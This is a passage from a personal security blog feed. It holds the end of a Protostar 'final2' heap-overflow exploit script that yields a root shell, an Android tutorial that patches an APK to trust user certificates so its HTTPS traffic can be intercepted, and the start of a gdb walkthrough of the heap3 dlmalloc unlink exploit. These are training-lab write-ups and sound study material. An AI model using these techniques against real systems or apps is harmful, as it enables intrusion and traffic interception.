s.sendall(ba)

ba = bytearray(bytes('FSRDROOT/', 'ascii'))
# Use integer overflow to make dlmalloc think third chunk is four bytes before second chunk.
ba.extend(struct.pack('I', 0xfffffffc) + struct.pack('I', 0xfffffffc))
# Add forward and backward pointers
ba.extend(struct.pack('I', 0x804d41c - 12) + struct.pack('I', 0x804e010))
ba = ba.ljust(REQSZ, b'\x41')
s.sendall(ba)

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<pre><code>python final2.py 192.168.99.107

Process OK
whoami
root
</code></pre>

<h3>References</h3>

<ul>
<li><a href="https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387">https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Analyze Mobile App Traffic and Reverse Engineer Its Non-Public API]]></title>
    <link href="https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api/"/>
    <updated>2020-10-16T17:08:35-04:00</updated>
    <id>https://www.davidxia.com/2020/10/how-to-analyze-mobile-app-traffic-and-reverse-engineer-its-non-public-api</id>
    <content type="html"><![CDATA[<p>Have you ever wanted to analyze the traffic between a mobile app and its servers or reverse engineer
a mobile app&rsquo;s non-public API? Here&rsquo;s one way.</p>

<p>The basic principle is to proxy the traffic from the app through a computer you control on which you
can capture and analyze traffic. If the app you&rsquo;re interested in is using an unencrypted protocol
like HTTP, this is pretty easy. Just run a proxy on your computer and configure your mobile device
to proxy network traffic through your computer&rsquo;s IP.</p>

<!-- more -->


<p>Most apps these days, however, use encrypted protocols like HTTPS (or are even required to by
default by mobile OSes). Data at the TCP layer and below like IP addresses and port numbers are
visible in plaintext, but all application level data at the HTTPS layer is encrypted. So you run a
proxy that supports HTTPS on your computer, but then your app doesn&rsquo;t trust the self-signed TLS
certificate your computer presents. Mobile apps used to trust certificates that the mobile device&rsquo;s
system trusted. So you could just download the self-signed certificate onto the mobile device and
configure the mobile OS to trust it. But these days mobile app frameworks let developers customize
their app&rsquo;s network security settings (<a href="https://developer.android.com/training/articles/security-config.html">like so for Android</a>).</p>

<p>Let&rsquo;s say your mobile app has custom trust anchors or pins certificates. What do you do now? You can
either</p>

<ol>
<li>disable the certificate check completely</li>
<li>or alter the certificate check</li>
</ol>


<p>I&rsquo;m not familiar with how to do this on iOS (there seem to be good resources out there <a href="https://www.guardsquare.com/en/blog/iOS-SSL-certificate-pinning-bypassing">like
this</a>) so will show how to do option two on Android.</p>

<h2>Setup mobile device and app</h2>

<p>I don&rsquo;t have an Android so used an emulator called <a href="https://www.genymotion.com/">Genymotion</a>. I created a Samsung Galaxy S9
virtual device which is has a recent enough Android OS to run most mobile apps. In order to install
the mobile app from the Google Play Store I had to install <a href="https://docs.genymotion.com/paas/7.0/07_Installing_OpenGApps.html#from-the-open-gapps-website">OpenGApps</a>. I think I&rsquo;m also able to
download the APK from the web and drag and drop it into the emulator to install.</p>

<!-- installed Hinge APK from here by drag and drop into emulator window
https://hinge-app.en.uptodown.com/android/download -->


<h2>Install Charles Proxy TLS certificate on device</h2>

<p>To install the <a href="https://www.charlesproxy.com/documentation/using-charles/ssl-certificates/">Charles cert</a>, I had to open <a href="http://www.charlesproxy.com/getssl/">this page</a> in Chrome. The built-in browser in the
emulator didn&rsquo;t seem to prompt me to download the Charles cert, but Chrome did. I installed Chrome
by install OpenGApps and then installing Chrome from the Play store. I think I also needed to
configure the Android device to use Charles as its proxy with <a href="https://stackoverflow.com/a/32865855">these steps</a> in order to get the
certificate download prompt. Then I made the Android device trust it.</p>

<h2>Patch the Android app&rsquo;s network security config</h2>

<p>I used `apktool to decompile the APK.</p>

<pre><code>brew install apktool

apktool d /path/to/app.apk
cd app
find . -name network_security_config.xml
./res/xml/network_security_config.xml

cat res/xml/network_security_config.xml

&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;network-security-config&gt;
    &lt;domain-config cleartextTrafficPermitted="true"&gt;
        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
    &lt;/domain-config&gt;
&lt;/network-security-config&gt;
</code></pre>

<p>The app only allows cleartext to the above two domains. I don&rsquo;t see any pinned certificates, but
there must be some defaults since the app didn&rsquo;t trust the same certs trusted by the Android OS. So
I updated <code>network_security_config.xml</code> to be the following.</p>

<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;network-security-config&gt;
    &lt;domain-config cleartextTrafficPermitted="true"&gt;
        &lt;domain includeSubdomains="true"&gt;res.cloudinary.com&lt;/domain&gt;
        &lt;domain includeSubdomains="true"&gt;app-res.cloudinary.com&lt;/domain&gt;
    &lt;/domain-config&gt;
    &lt;base-config&gt;
        &lt;trust-anchors&gt;
            &lt;certificates src="system" /&gt;
            &lt;certificates src="user" /&gt;
        &lt;/trust-anchors&gt;
    &lt;/base-config&gt;
&lt;/network-security-config&gt;
</code></pre>

<p>Then I tried recompiling the patched APK but got the following error.</p>

<pre><code>cd app
apktool b . -o ~/Downloads/app-patched.apk

I: Using Apktool 2.4.1
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes10 folder into classes10.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes9 folder into classes9.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes7 folder into classes7.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes6 folder into classes6.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes8 folder into classes8.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes3 folder into classes3.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes4 folder into classes4.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes5 folder into classes5.dex...
I: Checking whether sources has changed...
I: Smaling smali_classes2 folder into classes2.dex...
I: Checking whether resources has changed...
I: Building resources...
W: invalid resource directory name: /Users/dxia/Downloads/app/./res navigation
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_15064276297777137207.tmp, p, --forced-package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-version-vectors, -F, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL339327577576851750.tmp, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL5191817693537904820.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, -S, /Users/dxia/Downloads/app/./res, -M, /Users/dxia/Downloads/app/./AndroidManifest.xml]
</code></pre>

<p>This <a href="https://github.com/iBotPeaches/Apktool/issues/1978#issuecomment-452894225">Github issue comment</a> suggested I run that command with the <code>--use-aapt2</code> switch.
Then I got another error.</p>

<pre><code>apktool b --use-aapt2 . -o ~/Downloads/app-patched.apk

I: Using Apktool 2.4.1
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2119: error: resource 'drawable/$avd_hide_password__0' has invalid entry name '$avd_hide_password__0'. Invalid character '$avd_hide_password__0'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2120: error: resource 'drawable/$avd_hide_password__1' has invalid entry name '$avd_hide_password__1'. Invalid character '$avd_hide_password__1'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2121: error: resource 'drawable/$avd_hide_password__2' has invalid entry name '$avd_hide_password__2'. Invalid character '$avd_hide_password__2'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2122: error: resource 'drawable/$avd_show_password__0' has invalid entry name '$avd_show_password__0'. Invalid character '$avd_show_password__0'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2123: error: resource 'drawable/$avd_show_password__1' has invalid entry name '$avd_show_password__1'. Invalid character '$avd_show_password__1'.
W: /Users/dxia/Downloads/app-patched/./res/values/public.xml:2124: error: resource 'drawable/$avd_show_password__2' has invalid entry name '$avd_show_password__2'. Invalid character '$avd_show_password__2'.
W: error: resource android:style/Animation.InputMethodFancy is private.
W: error: resource android:style/Animation.VoiceInteractionSession is private.
W: error: resource android:style/AlertDialog is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:10: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:40: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:70: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v24/styles.xml:99: error: style attribute 'android:attr/preferenceListStyle' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:8: error: style attribute 'android:attr/allowMassStorage' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:13: error: resource android:attr/internalMaxWidth is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:16: error: resource android:attr/internalMaxWidth is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:20: error: style attribute 'android:attr/internalMinHeight' is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:17: error: resource android:attr/allowMassStorage is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v28/styles.xml:20: error: resource android:attr/allowMassStorage is private.
W: error: resource android:style/DialogWindowTitle is private.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:13: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:14: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:20: error: style attribute 'android:attr/attr/private_resource_pad36' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:21: error: style attribute 'android:attr/attr/private_resource_pad35' not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v23/styles.xml:24: error: resource android:attr/private_resource_pad31 not found.
W: /Users/dxia/Downloads/app-patched/./res/values-v26/styles.xml:10: error: style attribute 'android:attr/internalMinHeight' is private.
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/brut_util_Jar_11817644492691338390.tmp, link, -o, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6551307854758959712.tmp, --package-id, 127, --min-sdk-version, 21, --target-sdk-version, 29, --version-code, 160072564, --version-name, 7.21.0, --no-auto-version, --no-version-vectors, --no-version-transitions, --no-resource-deduping, -e, /var/folders/y_/sjt8100n43g69mtr9t588d6r0000gp/T/APKTOOL6723837428467013762.tmp, -0, arsc, -I, /Users/dxia/Library/apktool/framework/1.apk, --manifest, /Users/dxia/Downloads/app-patched/./AndroidManifest.xml, /Users/dxia/Downloads/app-patched/./build/resources.zip]
</code></pre>

<p><a href="https://github.com/iBotPeaches/Apktool/issues/2386#issuecomment-669505659">This PR</a> fixes the above on Linux and Windows. As of this writing, it&rsquo;s not released
yet. So I had to <a href="https://ibotpeaches.github.io/Apktool/build/">build from source</a> on an Ubuntu VM.</p>

<pre><code>java -jar ~/Apktool/brut.apktool/apktool-cli/build/libs/apktool-cli-all.jar b --use-aapt2 . -o ~/Downloads/app-patched.apk

I: Using Apktool 2.4.2-3ac7e8-SNAPSHOT
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
</code></pre>

<p>I signed the patched APK. First I generated some keys. I&rsquo;m not sure if certain signing and key
algorithms are required, but these are the ones I used.</p>

<pre><code>keytool -genkey -alias keys -keystore keys -sigalg MD5withRSA -keyalg RSA -keysize 2048 -validity 10000

Enter keystore password:
Re-enter new password:
What is your first and last name?
What is the name of your organizational unit?
What is the name of your organization?
What is the name of your City or Locality?
What is the two-letter country code for this unit?
Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
Warning:
The generated certificate uses the MD5withRSA signature algorithm which is considered a security risk.

jarsigner -sigalg MD5withRSA -digestalg SHA1 -verbose -keystore keys app-patched.apk keys
</code></pre>

<p>Then when dragging and dropping the patched APK into the virtual device, I got an error saying the
app couldn&rsquo;t be installed. In these cases, generating the logs and grepping through them for errors
like <code>INSTALL_PARSE_FAILED_NO_CERTIFICATES</code> and <code>INSTALL_FAILED_VERIFICATION_FAILURE</code> helps. I fixed
this last error by <a href="https://stackoverflow.com/questions/15014519/apk-installation-failed-install-failed-verification-failure">disabling USB verification</a> in the virtual device
settings. The setting for this is inside the virtual Android device itself under &ldquo;developer
settings.&rdquo;</p>

<h2>Sniff the traffic</h2>

<p>I made sure the traffic was proxied through my computer, the patched app started successfully, and I
was able to see unencrypted data in Charles!</p>

<p>{% img center <a href="https://i.imgur.com/e8p2Ne3h.jpg">https://i.imgur.com/e8p2Ne3h.jpg</a> %}</p>

<h2>References</h2>

<ul>
<li>&ldquo;<a href="https://gist.github.com/unoexperto/80694ccaed6dadc304ad5b8196cbbd2c">How to patch Android app to sniff its HTTPS traffic with self-signed certificate</a>&rdquo;</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Exploit Dlmalloc Unlink(): Protostar Level Heap3]]></title>
    <link href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/"/>
    <updated>2020-04-19T18:51:48-04:00</updated>
    <id>https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink</id>
    <content type="html"><![CDATA[<p>While stuck inside during social distancing, I&rsquo;ve been making my way through LiveOverflow&rsquo;s awesome
Youtube playlist &ldquo;<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Binary Exploitation / Memory Corruption</a>.&rdquo; His videos are structured
around a well known series of <a href="https://exploit-exercises.lains.space/protostar/">exploit exercises here</a> called &ldquo;Protostar.&rdquo; I took the
time to truly understand each one before moving onto the next as the exercises build on each
other. For the past several days I&rsquo;ve been trying to understand the <a href="https://exploit-exercises.lains.space/protostar/heap3/">&ldquo;Heap3&rdquo;
level</a>, a relatively complex level that requires manipulating the heap to redirect code
execution to an arbitrary function. After rewatching the video many times and reading numerous other
online explanations, I finally understand! That moment of understanding feels so gratifying.</p>

<p>Many other resources already explain the exploit well, but I&rsquo;m writing my own explanation to
reinforce my understanding and to celebrate.</p>

<!-- more -->


<h2>Exploit Exercise Protostar Heap3</h2>

<pre><code class="c">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
</code></pre>

<p>The source code is pretty straightforward. There&rsquo;s the <code>main()</code> and <code>winner()</code> functions. There&rsquo;s
three character pointers, three <code>malloc()</code>&rsquo;s, three <code>strcpy()</code>&rsquo;s, three <code>free()</code>&rsquo;s, and finally a
<code>printf()</code>. Our goal is to redirect code execution from <code>main()</code> to <code>winner()</code>.</p>

<p>The description at the top of the level is</p>

<blockquote><p>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to
change program execution.</p></blockquote>

<p>All these exercises are on 32-bit x86 architecture.</p>

<h2>Background on dlmalloc</h2>

<p>The vulnerable malloc is usually referred to as dlmalloc (named after one of its authors Doug Lea)
and must be an old version like <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e">this one from 1996</a>. The <a href="http://phrack.org/issues/57/9.html"><em>Phrack</em> article &ldquo;Once
Upon a free()&hellip;&rdquo;</a> provides useful background.</p>

<blockquote><p>Most malloc implementations share the behaviour of storing their own management information, such
as lists of used or free blocks, sizes of memory blocks and other useful data within the heap
space itself.</p>

<p>The central attack of exploiting malloc allocated buffer overflows is to modify this management
information in a way that will allow arbitrary memory overwrites afterwards.</p></blockquote>

<p>For our purposes, skip to the &ldquo;GNU C Library implementation&rdquo; section. It says that memory slices or
&ldquo;chunks&rdquo; created by malloc are organized  like so. On 32-bit systems, <code>prev_size</code> and <code>size</code> are
4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
<code>data</code> starts.</p>

<p>{% codeblock %}
.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
    chunk -> | prev_size                        |
             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
             | size                             |
             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
      mem -> | data                             |
             : &hellip;                              :
             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
nextchunk -> | prev_size &hellip;                    |
             :                                  :
{% endcodeblock %}</p>

<p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>

<ul>
<li>The lowest bit of <code>size</code> called <code>PREV_INUSE</code> indicates whether the previous chunk is used or not</li>
<li>Once we <code>free()</code> the chunk using <code>free(mem)</code>, the memory is released, and if
its neighboring chunks aren&rsquo;t free, dlmalloc will clear the next chunk&rsquo;s <code>PREV_INUSE</code> and add the
chunk to a doubly-linked list of other free chunks. It does this by adding a forward and backward
pointer at <code>mem</code>.</li>
</ul>


<p>{% codeblock %}
.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
    chunk -> | prev_size                        |
             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
             | size                             |
             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
      mem -> | fd                               |
             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
             | bk                               |
             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
             | (old memory, can be zero bytes)  |
             :                                  :</p>

<p>nextchunk -> | prev_size &hellip;                    |
             :                                  :
{% endcodeblock %}</p>

<ul>
<li>If neighboring chunks are free, dlmalloc will merge the just freed chunk with its neighboring
chunks. The two neighboring free chunks are in a doubly-linked list. dlmalloc first removes the
neighboring chunk at the lower memory address from the list, merges it with the recently freed
chunk, and repeats this for the neighboring chunk at the higher memory address. The unlinking is
done with a macro called <code>unlink()</code> which removes an entry from a doubly-linked list and ties the
loose ends of the list back together.</li>
</ul>


<pre><code>#define unlink(P, BK, FD)                                                     \
{                                                                             \
  BK = P-&gt;bk;                                                                 \
  FD = P-&gt;fd;                                                                 \
  FD-&gt;bk = BK;                                                                \
  BK-&gt;fd = FD;                                                                \
}                                                                             \
</code></pre>

<p>Written with pointer notation:</p>

<pre><code class="c">BK = *(P + 12);  # content of memory address P + 12 stored in BK
FD = *(P + 8);   # content of memory address P + 8 stored in FD
*(FD + 12) = BK; # set the content of memory address FD + 12 to BK
*(BK + 8) = FD;  # set the content of memory address BK + 8 to FD
</code></pre>

<p>Since we can overwrite the bytes of P, we can overwrite 4-bytes of memory at two arbitrary places.
To trigger this code path, chunks being consolidated must be bigger than 80 bytes. dlmalloc
classifies these chunks as &ldquo;fastbins.&rdquo;</p>

<blockquote><p>An array of lists holding recently freed small chunks. Fastbins are not doubly linked.</p></blockquote>

<h2>What the heap looks like in heap3.c</h2>

<p>Run gdb on <code>heap3.c</code>. My personal preference is to set the disassembly-flavor to intel and turn off
pagination.</p>

<pre><code>user@protostar:~$ cd /opt/protostar/bin

user@protostar:/opt/protostar/bin$ gdb heap3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
Reading symbols from /opt/protostar/bin/heap3...done.

(gdb) set disassembly-flavor intel
(gdb) set pagination off
</code></pre>

<p>We first disassemble the <code>main()</code> function.</p>

<pre><code>(gdb) disassemble main
Dump of assembler code for function main:
0x08048889 &lt;main+0&gt;:    push   ebp
0x0804888a &lt;main+1&gt;:    mov    ebp,esp
0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff0
0x0804888f &lt;main+6&gt;:    sub    esp,0x20
0x08048892 &lt;main+9&gt;:    mov    DWORD PTR [esp],0x20
0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x0804889e &lt;main+21&gt;:   mov    DWORD PTR [esp+0x14],eax
0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR [esp],0x20
0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488ae &lt;main+37&gt;:   mov    DWORD PTR [esp+0x18],eax
0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR [esp],0x20
0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
0x080488be &lt;main+53&gt;:   mov    DWORD PTR [esp+0x1c],eax
0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 &lt;main+60&gt;:   add    eax,0x4
0x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR [eax]
0x080488ca &lt;main+65&gt;:   mov    DWORD PTR [esp+0x4],eax
0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR [esp+0x14]
0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR [esp],eax
0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR [ebp+0xc]
0x080488dd &lt;main+84&gt;:   add    eax,0x8
0x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR [eax]
0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR [esp+0x4],eax
0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR [esp+0x18]
0x080488ea &lt;main+97&gt;:   mov    DWORD PTR [esp],eax
0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 &lt;main+108&gt;:  add    eax,0xc
0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR [eax]
0x080488fa &lt;main+113&gt;:  mov    DWORD PTR [esp+0x4],eax
0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR [esp+0x1c]
0x08048902 &lt;main+121&gt;:  mov    DWORD PTR [esp],eax
0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR [esp+0x1c]
0x0804890e &lt;main+133&gt;:  mov    DWORD PTR [esp],eax
0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR [esp+0x18]
0x0804891a &lt;main+145&gt;:  mov    DWORD PTR [esp],eax
0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR [esp+0x14]
0x08048926 &lt;main+157&gt;:  mov    DWORD PTR [esp],eax
0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
0x0804892e &lt;main+165&gt;:  mov    DWORD PTR [esp],0x804ac27
0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
0x0804893a &lt;main+177&gt;:  leave
0x0804893b &lt;main+178&gt;:  ret
End of assembler dump.
</code></pre>

<p>The printf has become a <code>puts()</code>. <code>plt</code> stands for procedure linkage table, one of the structures
which makes dynamic loading and linking easier to use. <code>@plt</code> means we are calling <code>puts</code> at PLT
entry at address <code>0x8048790</code>. If we disassemble that address we see</p>

<pre><code>(gdb) disassemble 0x8048790
Dump of assembler code for function puts@plt:
0x08048790 &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x804b128
0x08048796 &lt;puts@plt+6&gt;:    push   0x68
0x0804879b &lt;puts@plt+11&gt;:   jmp    0x80486b0
End of assembler dump.
</code></pre>

<p>It calls another function at address <code>0x804b128</code>. This address is part of the Global Offset Table
(GOT) which points to the dynamically linked library containing the actual <code>puts()</code> function.</p>

<pre><code>(gdb) x 0x804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
</code></pre>

<p>We want to replace the call to <code>puts()</code> with a call to <code>winner()</code>. So we want to overwrite the
contents of <code>0x804b128</code> in the GOT, currently <code>0x08048796</code>, with the address to <code>winner()</code>.</p>

<p>To get a visual sense of what the heap looks like, set breakpoints at every library function
call, i.e. break at the address of <code>malloc()</code>, <code>strcpy()</code>, <code>free()</code>, and <code>puts()</code>.</p>

<pre><code>(gdb) break *0x8048ff2
Breakpoint 1 at 0x8048ff2: file common/malloc.c, line 3211.
(gdb) break *0x8048750
Breakpoint 2 at 0x8048750
(gdb) break *0x8049824
Breakpoint 3 at 0x8049824: file common/malloc.c, line 3583.
(gdb) break *0x8048790
Breakpoint 4 at 0x8048790
</code></pre>

<p>Run the program with some recognizable input strings.</p>

<pre><code>(gdb) r AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
Starting program: /opt/protostar/bin/heap3 AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    common/malloc.c: No such file or directory.
    in common/malloc.c
</code></pre>

<p>We&rsquo;ve hit the first breakpoint. Continue past it so that one <code>malloc()</code> is called and the heap is
initialized.</p>

<pre><code>(gdb) c
Continuing.

Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
3211    in common/malloc.c
</code></pre>

<p>Now look at the mapped memory regions.</p>

<pre><code>(gdb) info proc mapping
process 1542
cmdline = '/opt/protostar/bin/heap3'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap3'
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
     0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
     0x804c000  0x804d000     0x1000          0           [heap]
    0xb7e96000 0xb7e97000     0x1000          0
    0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
    0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
    0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
    0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
    0xb7fd9000 0xb7fdc000     0x3000          0
    0xb7fe0000 0xb7fe2000     0x2000          0
    0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
    0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
    0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
    0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
    0xbffeb000 0xc0000000    0x15000          0           [stack]
</code></pre>

<p>The heap starts at <code>0x804c000</code>, ends at <code>0x804d000</code>, and has size <code>0x1000</code> or 4096 bytes. We can
define hooks in gdb. We define one to examine the first 56 words of the heap in hexadecimal every
time execution stops.</p>

<pre><code>(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
&gt;x/56wx 0x804c000
&gt;end
</code></pre>

<p>If we continue, we hit the third malloc. At this point two <code>malloc()</code>&rsquo;s have been called.</p>

<pre><code>(gdb) c
Continuing.
0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c050:  0x00000000  0x00000fb1  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
